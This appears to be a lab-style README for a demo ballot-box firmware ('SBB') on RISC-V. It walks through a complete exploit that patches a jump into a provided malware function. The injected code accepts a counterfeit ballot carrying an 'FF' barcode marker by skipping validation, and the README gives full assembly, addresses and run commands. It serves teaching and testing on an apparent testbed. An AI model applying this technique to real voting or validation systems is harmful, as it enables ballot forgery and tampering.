This is a more complicated example of how to redirect control flow in the SBB code to jump into the `malware` function, perform a computation, and then jump back into different places in the SBB code depending on the result of the computation. This example also discusses the expected format for valid barcodes. This exploit walks through how to check whether a ballot has a specific barcode (one that say, you crafted yourself), and if so, validate that ballot.

# Examine the SBB source code & use objdump

To piece this exploit together you need to answer two questions:

### Where should you insert the jump to your code?

First, let's find somewhere in the code to jump to your personal barcode check which will circumvent the normal validation. It's a little awkward because you're going to have to smash a few instructions to patch in a jump-to-our-code instruction (one if you use a relative jump, two or maybe even three if absolute). We're going to use 3 instructions to do an absolute jump because that's the easiest assembly to generate.

Looking at the [run_barcoded_detected](../../../source/sbb/sbb_machine.c#L281) function, let's smash the call to the `display_this_text`.

You can find the assemble corresponding to this call by using `riscv32-unknown-elf-objdump -d`. Without investigating too much, it looks like two instructions before the jump are setting up some arguments to the jump, so if we're smashing that function call we can also smash the argument setup.

```
c0025a44 <run_barcode_detected>:
c0025a44:       e5010113                addi    sp,sp,-43
...
c0025aa0        00078593                mv       a1,a5
c0025aa4:       00048513                mv       a0,s1
c0025aa8:       d90fe0ef                jal      ra,c0024038 <display_this_text>
```

While we're looking at the `run_barcode_detected` code let's also find where to jump back to.

If the barcode isn't the one you're looking for, you can jump back into the normal control flow, ie `0xc0025aac`.

If the barcode is the one you're looking for, why not jump past the validity check to [the code sequence](../../../source/sbb/sbb_machine.c#L297) that gets executed for valid barcodes. While we've got the objdump output open, let's find that instruction:

```
c0025c04:       3f5020ef                jal      ra,c00287f8 <debug_printf>
```

Great. Now you have a place to jump from (`0xc0025aa0`), and to jump back into if our personal barcode check does not pass (`0xc0025aac`), and also if it does (`0xc0025c04`).

### How do you check the barcode?

If you follow the logic that memcpy's the value into the barcode in the function we've been looking at, you'll discover that the barcode lives in a [static location](../../../source/sbb/sbb.c#L35). Let's figure out what this location is by using `riscv32-unknown-elf-objdump -t` to dump the symbol table.

Searching that output for "barcode" we find it is statically allocated at the address `0xc010aadc`:
```
c010aadc g      O .bss   000000fe barcode
```

Now that you know where the barcode is, how is the barcode supposed to be formatted?

Looking at [a comment in sbb_crypto.c](../../../source/sbb/sbb_crypto.c#L65) we see:
```
/**
    timeDigits # ":" # encodeBase64 (encryptedBallot # auth)
*/
```

An example of a validly formatted ballot can be found [here](../../../source/sbb/main_freertos.c#L82):
```
"2019+07+31+22+22:1bk5cBJeyseBExT54lsVpS6Qk0hN_c3uuX4feV6D_-k=";
```

To fingerprint our counterfeit ballot, let's check whether a specific pattern shows up in a specific location. Since the example above is a valid ballot, let's look for a similar but obviously invalid ballot, where the first two characters in the encrypted ballot are replaced with `FF`:
```
"2019+07+31+22+22:FFk5cBJeyseBExT54lsVpS6Qk0hN_c3uuX4feV6D_-k=";
```

The barcode begins at location `0xc010aadc` and our characters of interest are in the 17th & 18th positions, so we can find their locations by adding 17 & 18 respectively to the barcode location.

This means that the locations of the two "F" characters are `0xc010aaed` and `0xc010aaee`.

# Construct the exploit

Your exploit needs to do 2 things:
```
// 1. patch in the call to jump from the SBB code to our code
//      this code should jump past the barcode check when it's done

// 2. check the barcode
//      a. check the first byte
//      b. check the second byte
//      c. jump to 2 different locations in SBB,
//         depending on the success or failure of the checks above
```

Let's build up the assembly you'll put in `malware` in those 2 steps:

### Step 1. patch in the call

Okay let's figure out where we should jump to from the SBB code.

First, using `riscv32-unknown-elf-objdump -d` we can find the address of the malware function. In this case, it's `0xc001d170`.

Let's anchor where in the malware function we'll plan on jump into. To safely leave room for setup instructions, let's plan to jump in at `0xc001d500`.

Now we can construct the assembly for the patch point with a little help from [godbolt](https://godbolt.org/z/kv7Lk1):

```
        lui     a0, 786461
        addi    a0, a0, 1280 # 0xc001d500
        jr      a0
```

Save this to `jump-to-malware.asm`, then assemble it and get the hex:

```
[nix-shell]$ riscv32-unknown-elf-as -o jump-to-malware.elf jump-to-malware.asm
[nix-shell]$ riscv32-unknown-elf-objdump -d jump-to-malware.elf
...
   0:	c001d537          	lui  a0,0xc001d
   4:	50050513          	addi a0,a0,1280 # 0xc001d500
   8:	00050067          	jr   a0
```

Great, so this hex sequence is what we'll want to write. To get the assembly to do *that*
let's compile one more C program [using godbolt](https://godbolt.org/z/4nO9om):

```
void exploit() {
    int *patch_point = (int *)0xc0025aa0;
    patch_point[0] = 0xc001d537; // lui	a0,0xc001d
    patch_point[1] = 0x50050513; // addi a0,a0,1280 # 0xc001d500
    patch_point[2] = 0x00050067; // jr a0
}
```

Grab the RISC-V 32-bit instructions corresponding to the function body:

```
        lui     a0, 786470
        addi    a0, a0, -1376
        sw      a0, -12(s0)
        lw      a0, -12(s0)
        lui     a1, 786461
        addi    a1, a1, 1335
        sw      a1, 0(a0)
        lw      a0, -12(s0)
        lui     a1, 327760
        addi    a1, a1, 1299
        sw      a1, 4(a0)
        lw      a0, -12(s0)
        lui     a1, 80
        addi    a1, a1, 103
        sw      a1, 8(a0)
```

This is the assembly for step 1. Let's bookmark needing to jump past the code in step 2 until after we have that code written. On to step 2!

### Step 2. check the barcode

Once again, [describe what you want in C](https://godbolt.org/z/e5y6Xe) and take a look at the RISC-V 32-bit assembly:
```
void exploit() {
// 2. check the barcode
    char *barcode_magic_char = (char *)0xc010aaed;
    if (barcode_magic_char[0] == 'F' && barcode_magic_char[1] == 'F'){
        int *jump_to_success = (int *)0xc0025c04;
    } else {
        int *jump_to_failure = (int *)0xc0025aac;
    }
}
```

Sidenote: the compiler produces some extra `lw` / `sw` because it also smashes the `a0` register before the jump-- we're going to write slightly different assembly that uses more registers to avoid those loads & stores. That's why the assembly below doesn't match what you see in godbolt exactly.

Here's the adapted assembly:

```
    # load *barcode_magic_char into a0
    lui     a0, 786699
    addi    a0, a0, -1299 # 0xc010aaed;

    # Check for the first 'F'
    lbu     a4, 0(a0) # load byte unsigned @ a0 into a4
    addi    a1, zero, 70 # 70 is the ascii code for "F"
    bne     a4, a1, .FAILURE

    # Check for the next 'F'
    lbu     a4, 1(a0) # load byte unsigned @ a0, offset 1, into a4
    bne     a4, a1, .FAILURE

    # jump to the "this matched our check" location
    lui     a0, 786470
    addi    a0, a0, -1020 # 0xc0025c04
    jr   a0

.FAILURE:
    # jump to the "this failed to matched our check" location
    lui     a0, 786470
    addi    a0, a0, -1364 # 0xc0025aac
    jr   a0
```


### All together now

Finally, let's add a `.DONE` label that the initialization code from step 1 can jump to, to avoid checking the barcode when we load the `malware` function.

All together, it should look like this:

```
    # code to patch in our jump goes here; corresponded to this C:
    #    int *patch_point = (int *)0xc0025aa0;
    #    patch_point[0] = 0xc001d537; // lui a0,0xc001d
    #    patch_point[1] = 0x50050513; // addi a0,a0,1280 # 0xc001d500
    #    patch_point[2] = 0x00050067; // jr a0
    lui     a0, 786470
    addi    a0, a0, -1376
    sw      a0, -12(s0)
    lw      a0, -12(s0)
    lui     a1, 786461
    addi    a1, a1, 1335
    sw      a1, 0(a0)
    lw      a0, -12(s0)
    lui     a1, 327760
    addi    a1, a1, 1299
    sw      a1, 4(a0)
    lw      a0, -12(s0)
    lui     a1, 80
    addi    a1, a1, 103
    sw      a1, 8(a0)
    addi    a0, zero, 2

    nop
    nop
    nop

    # Jump past the barcode check we want to execute-- we don't want to execute it yet!
    # (If we did it would make for some weird control flow)
    # We'll just jump way past all these instructions deeper into malware:
    lui     a0, 0xc001d
    addi    a0, a0, 1792 #0xc001d700
    j .DONE

    # This will be aligned to # 0xc001d500
    nop
    nop

    # load *barcode_magic_char into a0
    lui     a0, 786699
    addi    a0, a0, -1299 # 0xc010aaed;

    # Check for the first 'F'
    lbu     a4, 0(a0) # load byte unsigned @ a0 into a4
    addi    a1, zero, 70 # 70 is the ascii code for "F"
    bne     a4, a1, .FAILURE

    # Check for the next 'F'
    lbu     a4, 1(a0) # load byte unsigned @ a0, offset 1, into a4
    bne     a4, a1, .FAILURE

    # jump to the "this matched our check" location
    lui     a0, 786470
    addi    a0, a0, -1020 # 0xc0025c04
    jr   a0

.FAILURE:
    # jump to the "this failed to matched our check" location
    lui     a0, 786470
    addi    a0, a0, -1364 # 0xc0025aac
    jr   a0

.DONE:
    nop
```

Save that in a file called check-for-my-barcode.asm, and you're ready to go!

# Run the exploit

Last detail-- you added a jump to the `run_barcode_detected` which will jump to exactly the address `0xc0025aa0`. That means you need the barcode checking part of our code that you wrote in step 2 to begin at that address.

Doing a little bit of math you can figure out that you need to start writing assembly at '0xc001d4a4'. Set that as the `malware_start_addr` environment variable:
```
export malware_start_addr='0xc001d4a4'
```

And you're ready to run the exploit. (Assuming you've already set `SSB_IP`. For a more in-depth explanation, see the [AES-key-to-display README](../AES-key-to-display/README.md). )

Move a directory down and call `run_exploit.sh`:

```
cd ..; ./run_exploit.sh payload.asm
```

# Recap

This example demonstrated how to patch in a jump from the SBB source code to the malware function, then perform a custom check in the malware function, and then redirect control flow back into the SBB code. To do this, you:

* examined the source code for an opportune location to redirect control flow
* examined the disassembly using objdump -d to:
    * find an acceptable sequence of instructions to squash (where to jump from)
    * find two acceptable locations to jump back to (one for success, one for failure)
* examined the source to find how the barcode was evaluated & created a custom check for an otherwise invalid ballot
* got the assembly to patch in the jump instructions
    * got the assembly instructions necessary to jump to malware
    * got the hex for those using as & objdump
    * wrote a C function which wrote those hex values to the correct location (the instructions in SBB you decided to squash)
    * got the assembly corresponding to that C function
* got the assembly corresponding to your custom check
* put those two pieces of assembly together, adding a "Done" label so that the patch instructions (which should run on initialization) can skip the custom barcode check
* figured out the correct position to write in the malware function so that your check is correctly positioned for the jump that you patched in; set that to the `malware_start_addr` environment variables
* ran `./run_exploit.sh` with your assembly as the payload
